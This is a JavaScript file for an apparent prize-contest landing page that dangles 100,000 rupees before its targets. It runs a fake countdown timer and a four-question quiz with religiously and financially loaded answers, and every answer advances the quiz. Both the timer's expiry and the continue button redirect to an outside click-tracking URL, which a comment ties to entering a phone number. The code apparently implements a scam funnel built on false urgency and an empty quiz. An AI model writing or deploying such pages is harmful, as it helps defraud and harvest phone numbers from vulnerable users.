// Display current date
const dateElement = document.getElementById('currentDate');
const currentDate = new Date().toLocaleDateString();
dateElement.textContent = currentDate;

// Countdown timer
let timeLeft = 300; // Время в секундах
const timerElement = document.getElementById('time');

const timer = setInterval(() => {
timeLeft--;

// Рассчитываем минуты и секунды
const minutes = Math.floor(timeLeft / 60);
const seconds = timeLeft % 60;

// Форматируем вывод
timerElement.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;

if (timeLeft <= 0) {
    clearInterval(timer);
    window.location.href = 'https://a.vivawins.com/click'; // Укажите URL, на который нужно перейти
}
}, 1000);



// Questions and answers
const questions = [
{
question: "1. Winning 100,000 rupees could change your life. What excites you the most about this opportunity?",
answers: [
    "It will help me support my family and loved ones.",
    "I can fulfill my dreams and ambitions.",
    "It’s truly a blessing from Allah.",
    "It’s a rare chance to change my future for the better."
]
},
{
question: "2. If you win today, what would you do with the prize money first?",
answers: [
    "Repay debts or loans that burden me.",
    "Invest in my children’s education and future.",
    "Save for emergencies and important needs.",
    "Donate to those in need and earn Allah’s blessings."
]
},
{
question: "3. How likely are you to participate in this contest for a chance to win 100,000 rupees?",
answers: [
    "Very likely – I am ready to take this chance!",
    "Likely – this seems like an amazing opportunity.",
    "Extremely likely – this could be my moment to shine!",
    "Absolutely certain – I trust in Allah and my destiny!"
]
},
{
question: "4. What motivates you the most to win this contest?",
answers: [
    "The opportunity to improve my family’s life.",
    "Achieving my dreams and personal goals.",
    "It’s a life-changing blessing and opportunity.",
    "Winning would be a sign of Allah’s blessings."
]
}
];


let currentQuestionIndex = 0;
const questionContainer = document.getElementById('questionContainer');
const questionText = document.getElementById('questionText');
const answersContainer = document.getElementById('answersContainer');
const startButton = document.getElementById('startButton');
const finalMessage = document.getElementById('finalMessage');
const continueButton = document.getElementById('continueButton');
const progressBar = document.getElementById('progressBar');

startButton.addEventListener('click', () => {
startButton.style.display = 'none';
showQuestion();
});

function showQuestion() {
if (currentQuestionIndex < questions.length) {
questionContainer.style.display = 'block';
finalMessage.style.display = 'none';
const currentQuestion = questions[currentQuestionIndex];
questionText.textContent = currentQuestion.question;
answersContainer.innerHTML = '';

currentQuestion.answers.forEach((answer) => {
    const button = document.createElement('button');
    button.textContent = answer;
    button.addEventListener('click', () => {
        nextQuestion(); // Move progress bar update to here
    });
    answersContainer.appendChild(button);
});
} else {
showFinalMessage();
}
}

function nextQuestion() {
currentQuestionIndex++;
// Update progress bar after answering the question
const progressPercentage = ((currentQuestionIndex) / questions.length) * 100; // currentQuestionIndex is used directly
progressBar.style.width = progressPercentage + '%';

showQuestion();
}


function showFinalMessage() {
    questionContainer.style.display = 'none';
    finalMessage.style.display = 'block';
    progressBar.style.width = '100%';
}

continueButton.addEventListener('click', () => {
    // Redirect to the next step (e.g., entering phone number)
    window.location.href = 'https://a.vivawins.com/click';
});